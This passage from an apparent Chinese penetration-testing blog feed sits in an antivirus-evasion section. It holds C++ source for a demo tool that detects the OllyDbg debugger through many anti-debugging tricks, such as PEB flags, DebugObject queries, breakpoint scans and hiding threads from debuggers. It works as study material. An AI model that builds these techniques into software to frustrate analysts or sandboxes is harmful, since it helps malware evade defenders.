src="https://p0.ssl.qhimg.com/t01216784fbcc79513b.png"></a></p><p>ShellBase是写的对地址进行base64加密的工具</p><p><a href="https://p5.ssl.qhimg.com/t01b53897990b45dbe4.png"><img src="https://p5.ssl.qhimg.com/t01b53897990b45dbe4.png"></a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.34-dong-tai-yun-sha-xiang-de-yuan-li-san/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.34-dong-tai-yun-sha-xiang-de-yuan-li-san/</url>
      
        <content type="html"><![CDATA[<p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1657242966014/9672781b0c8c42419362b79b9dc3f92b.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">// DetectODDlg.cpp : implementation file//#include "stdafx.h"#include "DetectOD.h"#include "DetectODDlg.h"#include "Shlwapi.h"#include "tlhelp32.h"#include "Windows.h"#include "Winable.h"#include "eh.h"#ifdef _DEBUG#define new DEBUG_NEW#undef THIS_FILEstatic char THIS_FILE[] = __FILE__;#endifstatic DWORD NewEip;/////////////////////////////////////////////////////////////////////////////// CAboutDlg dialog used for App Aboutclass CAboutDlg : public CDialog{public:CAboutDlg();// Dialog Data//{{AFX_DATA(CAboutDlg)enum { IDD = IDD_ABOUTBOX };//}}AFX_DATA// ClassWizard generated virtual function overrides//{{AFX_VIRTUAL(CAboutDlg)protected:virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support//}}AFX_VIRTUAL// Implementationprotected://{{AFX_MSG(CAboutDlg)afx_msg void OnMypage();afx_msg void OnMouseMove(UINT nFlags, CPoint point);virtual BOOL OnInitDialog();afx_msg void OnComeon();afx_msg void OnMyicon();//}}AFX_MSGDECLARE_MESSAGE_MAP()};CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD){//{{AFX_DATA_INIT(CAboutDlg)//}}AFX_DATA_INIT}void CAboutDlg::DoDataExchange(CDataExchange* pDX){CDialog::DoDataExchange(pDX);//{{AFX_DATA_MAP(CAboutDlg)//}}AFX_DATA_MAP}BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)//{{AFX_MSG_MAP(CAboutDlg)ON_BN_CLICKED(IDC_MYPAGE, OnMypage)ON_WM_MOUSEMOVE()ON_BN_CLICKED(IDC_COMEON, OnComeon)ON_BN_CLICKED(IDC_MYICON, OnMyicon)//}}AFX_MSG_MAPEND_MESSAGE_MAP()/////////////////////////////////////////////////////////////////////////////// CDetectODDlg dialogCDetectODDlg::CDetectODDlg(CWnd* pParent /*=NULL*/): CDialog(CDetectODDlg::IDD, pParent){//{{AFX_DATA_INIT(CDetectODDlg)// NOTE: the ClassWizard will add member initialization here//}}AFX_DATA_INIT// Note that LoadIcon does not require a subsequent DestroyIcon in Win32m_hIcon = AfxGetApp()-&gt;LoadIcon(IDR_MAINFRAME);}void CDetectODDlg::DoDataExchange(CDataExchange* pDX){CDialog::DoDataExchange(pDX);//{{AFX_DATA_MAP(CDetectODDlg)// NOTE: the ClassWizard will add DDX and DDV calls here//}}AFX_DATA_MAP}BEGIN_MESSAGE_MAP(CDetectODDlg, CDialog)//{{AFX_MSG_MAP(CDetectODDlg)ON_WM_SYSCOMMAND()ON_WM_PAINT()ON_WM_QUERYDRAGICON()ON_BN_CLICKED(IDC_WNDCLS, OnWndcls)ON_BN_CLICKED(IDC_ISDEBUGGERPRESENT, OnIsdebuggerpresent)ON_BN_CLICKED(IDC_ENUMWINDOW, OnEnumwindow)ON_BN_CLICKED(IDC_EnumProcess, OnEnumProcess)ON_BN_CLICKED(IDC_Explorer, OnExplorer)ON_BN_CLICKED(IDC_GetTickCount, OnGetTickCount)ON_BN_CLICKED(IDC_GetStartupInfo, OnGetStartupInfo)ON_BN_CLICKED(IDC_PEBFLAGS, OnPebflags)ON_BN_CLICKED(IDC_CHECKREMOTEDEBUGGERPRESENT, OnCheckremotedebuggerpresent)ON_BN_CLICKED(IDC_SetUnhandledExceptionFilter, OnSetUnhandledExceptionFilter)ON_BN_CLICKED(IDC_ZwQueryInformationProcess, OnZwQueryInformationProcess)ON_BN_CLICKED(IDC_SeDebugPrivilege, OnSeDebugPrivilege)ON_BN_CLICKED(IDC_NTQueryObject, OnNTQueryObject)ON_BN_CLICKED(IDC_DectectBreakpoints, OnDectectBreakpoints)ON_BN_CLICKED(IDC_DectectFuncBreakpoints, OnDectectFuncBreakpoints)ON_BN_CLICKED(IDC_BlockInput, OnBlockInput)ON_BN_CLICKED(IDC_CHECKSUM, OnChecksum)ON_BN_CLICKED(IDC_EnableWindow, OnEnableWindow)ON_BN_CLICKED(IDC_ZwSetInformationThread, OnZwSetInformationThread)ON_BN_CLICKED(IDC_OutputDebugString, OnOutputDebugString)ON_BN_CLICKED(IDC_GetEntryPoint, OnGetEntryPoint)ON_BN_CLICKED(IDC_TrapFlag, OnTrapFlag)ON_BN_CLICKED(IDC_GuardPages, OnGuardPages)ON_BN_CLICKED(IDC_HARDWAREBREAKPOINT, OnHardwarebreakpoint)ON_BN_CLICKED(IDC_ABOUT, OnAbout)ON_BN_CLICKED(IDC_MYPAGE2, OnMypage2)//}}AFX_MSG_MAPEND_MESSAGE_MAP()/////////////////////////////////////////////////////////////////////////////// CDetectODDlg message handlersBOOL CDetectODDlg::OnInitDialog(){CDialog::OnInitDialog();// Add "About..." menu item to system menu.// IDM_ABOUTBOX must be in the system command range.ASSERT((IDM_ABOUTBOX &amp; 0xFFF0) == IDM_ABOUTBOX);ASSERT(IDM_ABOUTBOX &lt; 0xF000);CMenu* pSysMenu = GetSystemMenu(FALSE);if (pSysMenu != NULL){CString strAboutMenu;strAboutMenu.LoadString(IDS_ABOUTBOX);if (!strAboutMenu.IsEmpty()){pSysMenu-&gt;AppendMenu(MF_SEPARATOR);pSysMenu-&gt;AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);}}// Set the icon for this dialog.  The framework does this automatically//  when the application's main window is not a dialog//SetIcon(m_hIcon, TRUE);// Set big icon//SetIcon(m_hIcon, FALSE);// Set small icon// TODO: Add extra initialization hereSetClassLong(m_hWnd,GCL_HICON,(LONG)(LoadIcon(AfxGetApp()-&gt;m_hInstance,MAKEINTRESOURCE(IDI_DOG))));return TRUE;  // return TRUE  unless you set the focus to a control}void CDetectODDlg::OnSysCommand(UINT nID, LPARAM lParam){if ((nID &amp; 0xFFF0) == IDM_ABOUTBOX){CAboutDlg dlgAbout;dlgAbout.DoModal();}else{CDialog::OnSysCommand(nID, lParam);}}// If you add a minimize button to your dialog, you will need the code below//  to draw the icon.  For MFC applications using the document/view model,//  this is automatically done for you by the framework.void CDetectODDlg::OnPaint() {if (IsIconic()){CPaintDC dc(this); // device context for paintingSendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);// Center icon in client rectangleint cxIcon = GetSystemMetrics(SM_CXICON);int cyIcon = GetSystemMetrics(SM_CYICON);CRect rect;GetClientRect(&amp;rect);int x = (rect.Width() - cxIcon + 1) / 2;int y = (rect.Height() - cyIcon + 1) / 2;// Draw the icondc.DrawIcon(x, y, m_hIcon);}else{CDialog::OnPaint();}}// The system calls this to obtain the cursor to display while the user drags//  the minimized window.HCURSOR CDetectODDlg::OnQueryDragIcon(){return (HCURSOR) m_hIcon;}void CDetectODDlg::OnWndcls() {// TODO: Add your control notification handler code hereHWND hWnd;if(hWnd=::FindWindow("OllyDbg",NULL)){MessageBox("发现OD");}else{MessageBox("没发现OD");}}void CDetectODDlg::OnIsdebuggerpresent() {// TODO: Add your control notification handler code hereif(IsDebuggerPresent()){MessageBox("发现OD");}else{MessageBox("没有OD");}}/***************************************************/BOOL CALLBACK EnumWindowsProc(  HWND hwnd,      // handle to parent window  LPARAM lParam   // application-defined value  ){char ch[100];CString str="Ollydbg";if(IsWindowVisible(hwnd)){::GetWindowText(hwnd,ch,100);//AfxMessageBox(ch);if(::StrStrI(ch,str)){AfxMessageBox("发现OD");return FALSE;}}return TRUE;}void CDetectODDlg::OnEnumwindow() {// TODO: Add your control notification handler code hereEnumWindows(EnumWindowsProc,NULL);AfxMessageBox("枚举窗口结束，未提示发现OD，则没有OD");}/***************************************************/void CDetectODDlg::OnEnumProcess() {// TODO: Add your control notification handler code hereHANDLE hwnd;PROCESSENTRY32 tp32;  //结构体CString str="OLLYDBG.EXE";BOOL bFindOD=FALSE;hwnd=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);if(INVALID_HANDLE_VALUE!=hwnd) {Process32First(hwnd,&amp;tp32);do{if(0==lstrcmpi(str,tp32.szExeFile)){AfxMessageBox("发现OD");bFindOD=TRUE;break;}}while(Process32Next(hwnd,&amp;tp32));if(!bFindOD)AfxMessageBox("没有OD");}CloseHandle(hwnd);}void CDetectODDlg::OnExplorer() {// TODO: Add your control notification handler code hereHANDLE hwnd;PROCESSENTRY32 tp32;  //结构体CString str="Explorer.EXE";DWORD ExplorerID;DWORD SelfID;DWORD SelfParentID;SelfID=GetCurrentProcessId();::GetWindowThreadProcessId(::FindWindow("Progman",NULL),&amp;ExplorerID);hwnd=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);if(INVALID_HANDLE_VALUE!=hwnd) {Process32First(hwnd,&amp;tp32);do{if(0==lstrcmp(str,tp32.szExeFile)){//ExplorerID=tp32.th32ProcessID;//AfxMessageBox("aaa");}if(SelfID==tp32.th32ProcessID){SelfParentID=tp32.th32ParentProcessID;}}while(Process32Next(hwnd,&amp;tp32));str.Format("本进程：%d 父进程：%d Explorer进程: %d ",SelfID,SelfParentID,ExplorerID);MessageBox(str);if(ExplorerID==SelfParentID){AfxMessageBox("没有OD");}else{AfxMessageBox("发现OD");}}CloseHandle(hwnd);}void CDetectODDlg::OnGetTickCount() {// TODO: Add your control notification handler code hereDWORD dTime1;DWORD dTime2;dTime1=GetTickCount();GetCurrentProcessId();GetCurrentProcessId();GetCurrentProcessId();GetCurrentProcessId();dTime2=GetTickCount();if(dTime2-dTime1&gt;100){AfxMessageBox("发现OD");}else{AfxMessageBox("没有OD");}}void CDetectODDlg::OnGetStartupInfo() {// TODO: Add your control notification handler code hereSTARTUPINFO info={0};GetStartupInfo(&amp;info);if(info.dwX!=0 || info.dwY!=0 || info.dwXCountChars!=0 || info.dwYCountChars!=0|| info.dwFillAttribute!=0 || info.dwXSize!=0 || info.dwYSize!=0){AfxMessageBox("发现OD");}else{AfxMessageBox("没有OD");}}//**********************************************typedef ULONG NTSTATUS;typedef ULONG PPEB;typedef ULONG KAFFINITY;typedef ULONG KPRIORITY;typedef struct _PROCESS_BASIC_INFORMATION { // Information Class 0NTSTATUS ExitStatus;PPEB PebBaseAddress;KAFFINITY AffinityMask;KPRIORITY BasePriority;ULONG UniqueProcessId;ULONG InheritedFromUniqueProcessId;} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;typedef enum _PROCESSINFOCLASS {ProcessBasicInformation, // 0 Y NProcessQuotaLimits, // 1 Y YProcessIoCounters, // 2 Y NProcessVmCounters, // 3 Y NProcessTimes, // 4 Y NProcessBasePriority, // 5 N YProcessRaisePriority, // 6 N YProcessDebugPort, // 7 Y YProcessExceptionPort, // 8 N YProcessAccessToken, // 9 N YProcessLdtInformation, // 10 Y YProcessLdtSize, // 11 N YProcessDefaultHardErrorMode, // 12 Y YProcessIoPortHandlers, // 13 N YProcessPooledUsageAndLimits, // 14 Y NProcessWorkingSetWatch, // 15 Y YProcessUserModeIOPL, // 16 N YProcessEnableAlignmentFaultFixup, // 17 N YProcessPriorityClass, // 18 N YProcessWx86Information, // 19 Y NProcessHandleCount, // 20 Y NProcessAffinityMask, // 21 N YProcessPriorityBoost, // 22 Y YProcessDeviceMap,// 23 Y YProcessSessionInformation, // 24 Y YProcessForegroundInformation, // 25 N YProcessWow64Information // 26 Y N} PROCESSINFOCLASS;typedef NTSTATUS (_stdcall *ZwQueryInformationProcess)(HANDLE ProcessHandle,PROCESSINFOCLASS ProcessInformationClass,PVOID ProcessInformation,ULONG ProcessInformationLength,PULONG ReturnLength); //定义函数指针void CDetectODDlg::OnPebflags() {// TODO: Add your control notification handler code here//定义函数指针变量ZwQueryInformationProcess MyZwQueryInformationProcess;HANDLE hProcess = NULL;PROCESS_BASIC_INFORMATION pbi = {0};    ULONG peb = 0;      ULONG cnt = 0;ULONG PebBase = 0;ULONG AddrBase;BOOL bFoundOD=FALSE;WORD flag;DWORD dwFlag;DWORD bytesrw;DWORD ProcessId=GetCurrentProcessId();    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, ProcessId);    if (hProcess != NULL) {//函数指针变量赋值MyZwQueryInformationProcess=(ZwQueryInformationProcess)GetProcAddress(LoadLibrary("ntdll.dll"),"ZwQueryInformationProcess");        //函数指针变量调用if (MyZwQueryInformationProcess(                 hProcess,ProcessBasicInformation,&amp;pbi,sizeof(PROCESS_BASIC_INFORMATION),&amp;cnt) == 0){            PebBase = (ULONG)pbi.PebBaseAddress;AddrBase=PebBase;if (ReadProcessMemory(hProcess,(LPCVOID)(PebBase+0x68),&amp;flag,2,&amp;bytesrw) &amp;&amp; bytesrw==2){ //PEB.NtGlobalFlagif(0x70==flag){bFoundOD=TRUE;}}if (ReadProcessMemory(hProcess,(LPCVOID)(PebBase+0x18),&amp;dwFlag,4,&amp;bytesrw) &amp;&amp; bytesrw==4){AddrBase=dwFlag;}if (ReadProcessMemory(hProcess,(LPCVOID)(AddrBase+0x0c),&amp;flag,2,&amp;bytesrw) &amp;&amp; bytesrw==2){//PEB.ProcessHeap.Flagsif(2!=flag){bFoundOD=TRUE;}}if (ReadProcessMemory(hProcess,(LPCVOID)(AddrBase+0x10),&amp;flag,2,&amp;bytesrw) &amp;&amp; bytesrw==2){//PEB.ProcessHeap.ForceFlagsif(0!=flag){bFoundOD=TRUE;}}if(bFoundOD==FALSE){AfxMessageBox("没有OD");}else{AfxMessageBox("发现OD");}        }        CloseHandle(hProcess);    }}//*******************************************************************typedef BOOL (WINAPI *CHECK_REMOTE_DEBUGGER_PRESENT)(HANDLE, PBOOL);void CDetectODDlg::OnCheckremotedebuggerpresent() {// TODO: Add your control notification handler code hereHANDLE      hProcess;    HINSTANCE   hModule;      BOOL        bDebuggerPresent = FALSE;    CHECK_REMOTE_DEBUGGER_PRESENT CheckRemoteDebuggerPresent;    hModule = GetModuleHandleA("Kernel32");    CheckRemoteDebuggerPresent =         (CHECK_REMOTE_DEBUGGER_PRESENT)GetProcAddress(hModule, "CheckRemoteDebuggerPresent");    hProcess = GetCurrentProcess();    CheckRemoteDebuggerPresent(hProcess,&amp;bDebuggerPresent); if(bDebuggerPresent==TRUE){AfxMessageBox("发现OD");}else{AfxMessageBox("没有OD");}}//********************************************************typedef NTSTATUS (_stdcall *ZW_QUERY_INFORMATION_PROCESS)(HANDLE ProcessHandle,PROCESSINFOCLASS ProcessInformationClass, //该参数也需要上面声明的数据结构PVOID ProcessInformation,ULONG ProcessInformationLength,PULONG ReturnLength); //定义函数指针void CDetectODDlg::OnZwQueryInformationProcess() {// TODO: Add your control notification handler code hereHANDLE      hProcess;    HINSTANCE   hModule;    DWORD       dwResult;    ZW_QUERY_INFORMATION_PROCESS MyFunc;    hModule = GetModuleHandle("ntdll.dll");    MyFunc=(ZW_QUERY_INFORMATION_PROCESS)GetProcAddress(hModule,"ZwQueryInformationProcess");    hProcess = GetCurrentProcess();    MyFunc(hProcess,ProcessDebugPort,&amp;dwResult,4,NULL);if(dwResult!=0){AfxMessageBox("发现OD");}else{AfxMessageBox("没有OD");}}//********************************************************static DWORD lpOldHandler;typedef LPTOP_LEVEL_EXCEPTION_FILTER (_stdcall  *pSetUnhandledExceptionFilter)(                      LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter                       );pSetUnhandledExceptionFilter lpSetUnhandledExceptionFilter;LONG WINAPI TopUnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo){_asm pushadAfxMessageBox("回调函数");lpSetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER )lpOldHandler);ExceptionInfo-&gt;ContextRecord-&gt;Eip=NewEip;//转移到安全位置_asm popadreturn EXCEPTION_CONTINUE_EXECUTION;}void CDetectODDlg::OnSetUnhandledExceptionFilter() {bool isDebugged=0;// TODO: Add your control notification handler code herelpSetUnhandledExceptionFilter = (pSetUnhandledExceptionFilter)GetProcAddress(LoadLibrary(("kernel32.dll")),  "SetUnhandledExceptionFilter"); lpOldHandler=(DWORD)lpSetUnhandledExceptionFilter(TopUnhandledExceptionFilter);_asm{  //获取这个安全地址call me     //方式一，需要NewEip加上一个偏移值me:pop NewEip  //方式一结束mov NewEip,offset safe //方式二，更简单int 3  //触发异常}AfxMessageBox("检测到OD");isDebugged=1;_asm{safe:}if(1==isDebugged){}else{AfxMessageBox("没有OD");}}//********************************************************void CDetectODDlg::OnSeDebugPrivilege() {// TODO: Add your control notification handler code hereHANDLE hProcessSnap;HANDLE hProcess;PROCESSENTRY32 tp32;  //结构体CString str="csrss.exe";hProcessSnap=::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);if(INVALID_HANDLE_VALUE!=hProcessSnap) {Process32First(hProcessSnap,&amp;tp32);do{if(0==lstrcmpi(str,tp32.szExeFile)){hProcess=OpenProcess(PROCESS_QUERY_INFORMATION,NULL,tp32.th32ProcessID);if(NULL!=hProcess){AfxMessageBox("发现OD");}else{AfxMessageBox("没有OD");}CloseHandle(hProcess);}}while(Process32Next(hProcessSnap,&amp;tp32));}CloseHandle(hProcessSnap);}//***************************************************************#ifndef STATUS_INFO_LENGTH_MISMATCH#define STATUS_INFO_LENGTH_MISMATCH((UINT32)0xC0000004L)#endiftypedef enum _POOL_TYPE {  NonPagedPool,  PagedPool,  NonPagedPoolMustSucceed,  DontUseThisType,  NonPagedPoolCacheAligned,  PagedPoolCacheAligned,  NonPagedPoolCacheAlignedMustS} POOL_TYPE;typedef struct _UNICODE_STRING {    USHORT Length;    USHORT MaximumLength;    PWSTR Buffer;} UNICODE_STRING;typedef UNICODE_STRING *PUNICODE_STRING;typedef const UNICODE_STRING *PCUNICODE_STRING;typedef enum _OBJECT_INFORMATION_CLASS{ObjectBasicInformation,// Result is OBJECT_BASIC_INFORMATION structureObjectNameInformation,// Result is OBJECT_NAME_INFORMATION structureObjectTypeInformation,// Result is OBJECT_TYPE_INFORMATION structureObjectAllTypesInformation,// Result is OBJECT_ALL_INFORMATION structureObjectDataInformation// Result is OBJECT_DATA_INFORMATION structure} OBJECT_INFORMATION_CLASS, *POBJECT_INFORMATION_CLASS;typedef struct _OBJECT_TYPE_INFORMATION {UNICODE_STRING TypeName; ULONG TotalNumberOfHandles; ULONG TotalNumberOfObjects; WCHAR Unused1[8]; ULONG HighWaterNumberOfHandles; ULONG HighWaterNumberOfObjects; WCHAR Unused2[8]; ACCESS_MASK InvalidAttributes; GENERIC_MAPPING GenericMapping; ACCESS_MASK ValidAttributes; BOOLEAN SecurityRequired; BOOLEAN MaintainHandleCount; USHORT MaintainTypeList; POOL_TYPE PoolType; ULONG DefaultPagedPoolCharge; ULONG DefaultNonPagedPoolCharge;} OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;typedef struct _OBJECT_ALL_INFORMATION {ULONG NumberOfObjectsTypes; OBJECT_TYPE_INFORMATION ObjectTypeInformation[1];} OBJECT_ALL_INFORMATION, *POBJECT_ALL_INFORMATION;typedef struct _OBJECT_ALL_TYPES_INFORMATION {    ULONG NumberOfTypes;    OBJECT_TYPE_INFORMATION TypeInformation[1];} OBJECT_ALL_TYPES_INFORMATION, *POBJECT_ALL_TYPES_INFORMATION;typedef UINT32 (__stdcall  *ZwQueryObject_t) (   IN HANDLE ObjectHandle, IN OBJECT_INFORMATION_CLASS ObjectInformationClass, OUT PVOID ObjectInformation, IN ULONG Length, OUT PULONG ResultLength );void CDetectODDlg::OnNTQueryObject() {// TODO: Add your control notification handler code here// 调试器必须正在调试才能检测到，仅打开OD是检测不到的HMODULE hNtDLL;DWORD dwSize;UINT i;UCHAR  KeyType=0;OBJECT_ALL_TYPES_INFORMATION *Types;OBJECT_TYPE_INFORMATION*t;ZwQueryObject_t ZwQueryObject;hNtDLL = GetModuleHandle("ntdll.dll");if(hNtDLL){ZwQueryObject = (ZwQueryObject_t)GetProcAddress(hNtDLL, "ZwQueryObject");UINT32 iResult = ZwQueryObject(NULL, ObjectAllTypesInformation, NULL, NULL, &amp;dwSize);if(iResult==STATUS_INFO_LENGTH_MISMATCH){Types = (OBJECT_ALL_TYPES_INFORMATION*)VirtualAlloc(NULL,dwSize,MEM_COMMIT,PAGE_READWRITE);if (Types == NULL) return;    if (iResult=ZwQueryObject(NULL,ObjectAllTypesInformation, Types, dwSize, &amp;dwSize)) return;for (t=Types-&gt;TypeInformation,i=0;i&lt;Types-&gt;NumberOfTypes;i++){   if ( !_wcsicmp(t-&gt;TypeName.Buffer,L"DebugObject")) //比较两个是否相等，这个L很特殊，本地的意思{   if(t-&gt;TotalNumberOfHandles &gt; 0 || t-&gt;TotalNumberOfObjects &gt; 0){AfxMessageBox("发现OD");VirtualFree (Types,0,MEM_RELEASE);return;}break; // Found Anyways}t=(OBJECT_TYPE_INFORMATION *)((char *)t-&gt;TypeName.Buffer+((t-&gt;TypeName.MaximumLength+3)&amp;~3));}}AfxMessageBox("没有OD!");VirtualFree (Types,0,MEM_RELEASE);}}/*********************************************************/BOOL DetectBreakpoints(){BOOL bFoundOD;bFoundOD=FALSE;__asm{jmp     CodeEnd      CodeStart:   mov     eax,ecx  ;被保护的程序段                nop                push    eax                push    ecx                pop     ecx                pop     eax   CodeEnd:                   cld               ;检测代码开始                mov     edi,offset CodeStartmov     edx,offset CodeStart                mov     ecx,offset CodeEndsub     ecx,edx                mov     al,0CCH                repne   scasbjnz      ODNotFoundmov bFoundOD,1ODNotFound:}return bFoundOD;}void CDetectODDlg::OnDectectBreakpoints() {// TODO: Add your control notification handler code hereif(DetectBreakpoints()){AfxMessageBox("发现OD");}else{AfxMessageBox("没有OD");}}/*********************************************************/BOOL DetectFuncBreakpoints(){BOOL bFoundOD;bFoundOD=FALSE;DWORD dwAddr;dwAddr=(DWORD)::GetProcAddress(LoadLibrary("user32.dll"),"MessageBoxA");__asm{                cld               ;检测代码开始                mov     edi,dwAddrmov     ecx,100   ;100bytes                mov     al,0CCH                repne   scasbjnz     ODNotFoundmov bFoundOD,1ODNotFound:}return bFoundOD;}void CDetectODDlg::OnDectectFuncBreakpoints() {// TODO: Add your control notification handler code hereif(DetectFuncBreakpoints()){AfxMessageBox("发现OD");}else{AfxMessageBox("没有OD");}}void CDetectODDlg::OnBlockInput() {   // #include "Winable.h"// TODO: Add your control notification handler code hereDWORD dwNoUse;DWORD dwNoUse2;::BlockInput(TRUE);    dwNoUse=2;dwNoUse2=3;dwNoUse=dwNoUse2;::BlockInput(FALSE);}/*********************************************************/BOOL CheckSum(){    BOOL bFoundOD;bFoundOD=FALSE;DWORD CHECK_SUM=5555; //正确校验值DWORD dwAddr;dwAddr=(DWORD)CheckSum;__asm{                              ;检测代码开始                mov     esi,dwAddrmov     ecx,100xor     eax,eax checksum_loop:                movzx ebx,byte ptr [esi]                add eax,ebx                rol eax,1                inc esi                loop checksum_loop                        cmp eax,CHECK_SUMjz      ODNotFoundmov     bFoundOD,1ODNotFound:}return bFoundOD;}void CDetectODDlg::OnChecksum() {// TODO: Add your control notification handler code hereif(CheckSum()){AfxMessageBox("发现OD");}else{AfxMessageBox("没有OD");}}/*********************************************************/void CDetectODDlg::OnEnableWindow() {// TODO: Add your control notification handler code hereCWnd *wnd;wnd=GetForegroundWindow();wnd-&gt;EnableWindow(FALSE);DWORD dwNoUse;DWORD dwNoUse2;    dwNoUse=2;dwNoUse2=3;dwNoUse=dwNoUse2;wnd-&gt;EnableWindow(TRUE);}/*********************************************************/typedef enum _THREADINFOCLASS {ThreadBasicInformation, // 0 Y NThreadTimes, // 1 Y NThreadPriority, // 2 N YThreadBasePriority, // 3 N YThreadAffinityMask, // 4 N YThreadImpersonationToken, // 5 N YThreadDescriptorTableEntry, // 6 Y NThreadEnableAlignmentFaultFixup, // 7 N YThreadEventPair, // 8 N YThreadQuerySetWin32StartAddress, // 9 Y YThreadZeroTlsCell, // 10 N YThreadPerformanceCount, // 11 Y NThreadAmILastThread, // 12 Y NThreadIdealProcessor, // 13 N YThreadPriorityBoost, // 14 Y YThreadSetTlsArrayAddress, // 15 N YThreadIsIoPending, // 16 Y NThreadHideFromDebugger // 17 N Y} THREAD_INFO_CLASS;typedef NTSTATUS (NTAPI *ZwSetInformationThread)(IN  HANDLE ThreadHandle,IN  THREAD_INFO_CLASSThreadInformaitonClass,IN  PVOID ThreadInformation,IN  ULONG ThreadInformationLength);void CDetectODDlg::OnZwSetInformationThread() {// TODO: Add your control notification handler code hereCString str="利用我定位";HANDLE hwnd;HMODULE hModule;hwnd=GetCurrentThread();hModule=LoadLibrary("ntdll.dll");ZwSetInformationThread myFunc;myFunc=(ZwSetInformationThread)GetProcAddress(hModule,"ZwSetInformationThread");myFunc(hwnd,ThreadHideFromDebugger,NULL,NULL);}/*********************************************************/void CDetectODDlg::OnOutputDebugString() {// TODO: Add your control notification handler code here::OutputDebugString("%s%s%s");}/*********************************************************/void CDetectODDlg::OnGetEntryPoint() {// TODO: Add your control notification handler code hereIMAGE_DOS_HEADER *dos_head=(IMAGE_DOS_HEADER *)GetModuleHandle(NULL);PIMAGE_NT_HEADERS32 nt_head=(PIMAGE_NT_HEADERS32)((DWORD)dos_head+(DWORD)dos_head-&gt;e_lfanew);DWORD EP=(nt_head-&gt;OptionalHeader.AddressOfEntryPoint);CString str;str.Format("%x",EP);AfxMessageBox(str);BYTE*OEP=(BYTE*)(nt_head-&gt;OptionalHeader.AddressOfEntryPoint+(DWORD)dos_head);for(unsigned long index=0;index&lt;20;index++){if(OEP[index]==0xcc){ExitProcess(0);}}}/**************************************************************/void terminateFunc(){AfxMessageBox("set_terminate指定的函数\n");exit(0);}void CDetectODDlg::OnButton1() {// TODO: Add your control notification handler code hereset_terminate(terminateFunc);try{div(10,0);}catch(int){AfxMessageBox("仅捕获整型异常");}catch(...){terminate(); //所有其它异常}AfxMessageBox("啊哈");}//********************************************************void CDetectODDlg::OnTrapFlag() {try{_asm{pushfd //触发单步异常or      dword ptr [esp],100h   ;TF=1popfd}AfxMessageBox("检测到OD");}catch(...){AfxMessageBox("没有OD");}}//********************************************************static bool isDebugged=1;LONG WINAPI TopUnhandledExceptionFilter2(struct _EXCEPTION_POINTERS *ExceptionInfo){_asm pushadAfxMessageBox("回调函数");lpSetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER )lpOldHandler);ExceptionInfo-&gt;ContextRecord-&gt;Eip=NewEip;isDebugged=0;_asm popadreturn EXCEPTION_CONTINUE_EXECUTION;}void CDetectODDlg::OnGuardPages() {// TODO: Add your control notification handler code hereULONG dwOldType;DWORD dwPageSize;LPVOID lpvBase;               // 获取内存的基地址SYSTEM_INFO sSysInfo;         // 系统信息GetSystemInfo(&amp;sSysInfo);     // 获取系统信息dwPageSize=sSysInfo.dwPageSize;//系统内存页大小lpSetUnhandledExceptionFilter = (pSetUnhandledExceptionFilter)GetProcAddress(LoadLibrary(("kernel32.dll")),  "SetUnhandledExceptionFilter"); lpOldHandler=(DWORD)lpSetUnhandledExceptionFilter(TopUnhandledExceptionFilter2);  // 分配内存lpvBase = VirtualAlloc(NULL,dwPageSize,MEM_COMMIT,PAGE_READWRITE);if (lpvBase==NULL)AfxMessageBox("内存分配失败");_asm{mov   NewEip,offset safe //方式二，更简单mov   eax,lpvBasepush  eax    mov   byte ptr [eax],0C3H //写一个 RETN 到保留内存，以便下面的调用}if(0==::VirtualProtect(lpvBase,dwPageSize,PAGE_EXECUTE_READ | PAGE_GUARD,&amp;dwOldType)){AfxMessageBox("执行失败");}_asm{pop   ecxcall  ecx   //调用时压栈safe:pop  ecx    //堆栈平衡，弹出调用时的压栈}if(1==isDebugged){AfxMessageBox("发现OD");}else{AfxMessageBox("没有OD");}VirtualFree(lpvBase,dwPageSize,MEM_DECOMMIT);}//********************************************************static bool isDebuggedHBP=0;LONG WINAPI TopUnhandledExceptionFilterHBP(struct _EXCEPTION_POINTERS *ExceptionInfo){_asm pushadAfxMessageBox("回调函数被调用");ExceptionInfo-&gt;ContextRecord-&gt;Eip=NewEip;if(0!=ExceptionInfo-&gt;ContextRecord-&gt;Dr0||0!=ExceptionInfo-&gt;ContextRecord-&gt;Dr1||0!=ExceptionInfo-&gt;ContextRecord-&gt;Dr2||0!=ExceptionInfo-&gt;ContextRecord-&gt;Dr3)isDebuggedHBP=1;  //检测有无硬件断点ExceptionInfo-&gt;ContextRecord-&gt;Dr0=0; //禁用硬件断点，置0ExceptionInfo-&gt;ContextRecord-&gt;Dr1=0;ExceptionInfo-&gt;ContextRecord-&gt;Dr2=0;ExceptionInfo-&gt;ContextRecord-&gt;Dr3=0;ExceptionInfo-&gt;ContextRecord-&gt;Dr6=0;ExceptionInfo-&gt;ContextRecord-&gt;Dr7=0;ExceptionInfo-&gt;ContextRecord-&gt;Eip=NewEip; //转移到安全位置_asm popadreturn EXCEPTION_CONTINUE_EXECUTION;}void CDetectODDlg::OnHardwarebreakpoint() {// TODO: Add your control notification handler code herelpSetUnhandledExceptionFilter = (pSetUnhandledExceptionFilter)GetProcAddress(LoadLibrary(("kernel32.dll")),  "SetUnhandledExceptionFilter"); 